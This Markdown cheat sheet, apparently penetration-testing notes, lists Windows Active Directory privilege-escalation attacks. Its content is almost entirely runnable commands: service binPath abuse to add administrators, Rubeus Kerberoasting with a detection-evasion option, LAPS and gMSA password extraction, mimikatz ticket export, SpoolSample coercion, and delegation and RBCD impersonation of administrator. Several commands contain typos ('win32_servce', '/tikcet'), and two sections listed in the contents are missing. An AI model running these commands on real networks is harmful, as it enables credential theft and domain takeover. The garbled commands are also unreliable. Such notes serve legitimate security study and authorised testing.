# Privilege Escalation

- [Service Running](#service-running)
- [Kerberos](#kerberos)
- [LAPS](#laps)
- [gMSA](#gmsa)
- [Deleguation](#deleguation)
    - [Unconstrained Deleguation](#unconstrained-delegation)
    - [Constrained Delegation](#constrained-delegation)
    - [Ressource Based Constrained Delegation](#resource-based-constrained-delegation)
    - [Constrained Delegation with Protocol Transition](#constrained-delegation-with-protocol-transition)
- [DLL Hijacking](#dll-hijacking)
- [Group Membership](#group-membership)
- [Tool list](#tool-list)
     

## Service running 

### Enumeration

Display all service running (powerhsell)
```
    Get-wmiObject -Class win32_servce | select pathname
```

PowerUp

Get services with unquoted paths and a space in their name
```
    Get-ServiceUnquoted -Verbose
```

Get services where the current user can write to its binary path or change arguments to the binary
```
    Get-ModifiableServiceFile -Verbose
```

Get the services whose configuration current user can modify
```
    Get-ModifiableService -Verbose
```

### Exploitation

Using PowerUp
```
    Invoke-ServiceAbuse -Name <service> -Username <domain>\<username> -Verbose
```

Using AccessChk
```
    accesschk64.exe -uwcqv '<user>' *
    sc.exe config <service> binPath= "net localgroup administrators <domain>\<username> /add"
    sc.exe stop <service>
    sc.exe start <service>
```

## Kerberos

### Enumeration

Find user accounts used as Service accounts using AD-Module
```
    Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

Find user accounts used as Service accounts using Powerview
```
    Get-DomainUser –SPN
```

Use Rubeus to list Kerberoast stats
```
    Rubeus.exe kerberoast /stats
```

To avoid detections based on Encryption Downgrade
```
    Rubeus.exe kerberoast /stats /rc4opsec
```

### Exploitation

Use Rubeus to request a TGS
```
    Rubeus.exe kerberoast /user:<serviceaccount> /simple
    Rubeus.exe kerberoast /user:<serviceaccount> /simple /rc4opsec
```

Kerberoast all possible accounts
```
    Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
```

## LAPS

### Enumeration

To find users who can read the passwords in clear text machines in OUs using powerview
```
    Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName$_.SecurityIdentifier);$_}
```

To enumerate OUs where LAPS is in use along with users who can read the passwords in clear text using AD-Module
```
    See Get-LapsPermissions.ps1
```

To enumerate OUs where LAPS is in use along with users who can read the passwords in clear text using LAPS module
```
    Import-Module C:\AD\Tools\AdmPwd.PS\AdmPwd.PS.psd1
    Find-AdmPwdExtendedRights -Identity OUDistinguishedName
```

### Exploitation

Using powerview 
```
    Get-DomainObject -Identity <target> | select -ExpandProperty ms-mcs-admpwd
```

Using Active Directory module :
```
	Get-ADComputer -Identity <targetmachine> -Properties ms-mcs-admpwd | select -ExpandProperty ms-mcs-admpwd
```

Using LAPS module :
```
	Get-AdmPwdPassword -ComputerName <targetmachine>
```

## gMSA

### Enumeration

Using ADModule :
```
	Get-ADServiceAccount -Filter *
```
	
Using PowerView :
```
	Get-DomainObject -LDAPFilter '(objectClass=msDS-GroupManagedServiceAccount)'
```	
Read it using ADModule:
```
	Get-ADServiceAccount -Identity <user> -Properties * | select PrincipalsAllowedToRetrieveManagedPassword	
```

Enumerate the Principals that can read the password blob:
```
	Get-ADServiceAccount -Identity <user> -Properties * | select PrincipalsAllowedToRetrieveManagedPassword
```

### Exploitation

Use ADModule to read and DSInternals to compute NTLM hash
```
    $Passwordblob = (Get-ADServiceAccount -Identity jumpone -Properties msDS-ManagedPassword).'msDS-ManagedPassword'
    . .\DSInternals.psd1
    $decodedpwd = ConvertFrom-ADManagedPasswordBlob $Passwordblob
    ConvertTo-NTHash -Password $decodedpwd.SecureCurrentPassword
```

## Deleguation

### Unconstrained Delegation

#### Enumeration 

Using Powerview
```
Get-DomainComputer -UnConstrained
```

ActiveDirectory module
```
	Get-ADComputer -Filter {TrustedForDelegation -eq $True}
	Get-ADUser -Filter {TrustedForDelegation -eq $True}
```

#### Exploitation

```
    mimikatz
    privilege::debug
    sekurlsa::tickets /export #Recommended way
    kerberos::list /export #Another way
```

Monitor login 
```
    Rubeus.exe monitor /targetuser:<username> /interval:10
```

Force login
```
    SpoolSample.exe <printmachine> <unconstrinedmachine>
```

Alternative
```
    MS-RPRN.exe \\<printmachine> \\<unconstrinedmachine>

```
Copy the base64 encoded TGT
```
	Rubeus.exe ptt /tikcet:<ticket>
```

### Constrained Delegation

#### Enumeration

Using Powerview
```
	Get-DomainUser –TrustedToAuth
	Get-DomainComputer –TrustedToAuth
```

ActiveDirectory module
```
	Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```

#### Exploitation

```
	Rubeus.exe tgtdeleg #Request fake tgt for current user
    Rubeus.exe tgtdeleg /user:<user> #Request fake tgt specifique user
```

```
	Rubeus.exe s4u /user:<user> /ticket:<base64 ticket> /impersonateuser:administrator /msdsspn:<service>/<target.domain> /domain:<domain> /alterservice:<services> /ptt
```


### Resource-based Constrained Delegation

#### Enumeration

Using Powerview
```
	Get-DomainObject -Identity "dc=<domain>,dc=local" -Domain <domain> #verify that you can add machine account
    Get-DomainController #Verify that the DC is running atleast Windows 2012
    Get-NetComputer <target> | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity #object must not have the attribute msds-allowedtoactonbehalfofotheridentity set
```

#### Exploitation

Create a computer object using powermad
```
	import-module powermad.ps1
    New-MachineAccount -MachineAccount <computer> -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
    Get-DomainComputer <computer> #verify that the computer object is create
```

Configure RBCD using AD-module
```
	Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
    Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
Configure RBCD using powerview
```
    $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-2552734371-813931464-1050690807-1154)"
    $SDBytes = New-Object byte[] ($SD.BinaryLength)
    $SD.GetBinaryForm($SDBytes, 0)
	Get-DomainComputer <target> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose # To verify if it work

    Rubeus.exe hash /password:<password> /user:<computer> /domain:<domain>
    rubeus.exe s4u /user:<computer> /rc4:<hash> /impersonateuser:<user> /msdsspn:<service>/<target> /alterservice:<service, services> /ptt
```

### Constrained Delegation with Protocol Transition

#### Enumeration

Using powerview
```
    Get-DomainUser –TrustedToAuth -Domain <domain>
	Get-DomainComputer –TrustedToAuth -Domain <domain>
```

Using AD-Module
```
    Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo -Server <target>
```

#### Exploitation

```
    Rubeus.exe hash /password:<password> /user:<user> /domain:<domain>
	Rubeus.exe s4u /user:<user> /rc4:<hash> /impersonateuser:<user> /domain:<domain> /msdsspn:<service>/<target.domain> /altservice:<service> /dc:<DC> /ptt
```


## Tool list

- PowerUp
https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1

- AccessChk
https://learn.microsoft.com/fr-fr/sysinternals/downloads/accesschk

- AD-Module
https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps

- Powerview 
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

- Rubeus
https://github.com/GhostPack/Rubeus

- MS-RPRN
https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/

- SpoolSample
https://github.com/leechristensen/SpoolSample

- Powermad
https://github.com/Kevin-Robertson/Powermad/